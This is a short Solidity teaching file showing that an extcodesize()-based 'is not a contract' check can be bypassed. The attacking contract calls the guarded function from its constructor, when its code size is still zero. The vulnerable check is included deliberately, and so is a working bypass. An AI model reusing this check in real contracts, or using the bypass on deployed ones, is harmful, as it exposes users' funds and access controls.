// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

/*
Here is a demonstration of why using extcodesize() to check if the caller is a contract 
is not safe.
*/

contract HackableContract {
    // this method is not reliable since it relies on extcodesize which returns 0
    // for contracts in construction as the code is only stored at the end of the
    // constructor's execution
    function isContract(address account) public view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    // one may think that pwned cannot be updated by a contract
    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

contract AttackingContract {
    constructor(address _hackableContract) {
        HackableContract(_hackableContract).protected();
    }
}
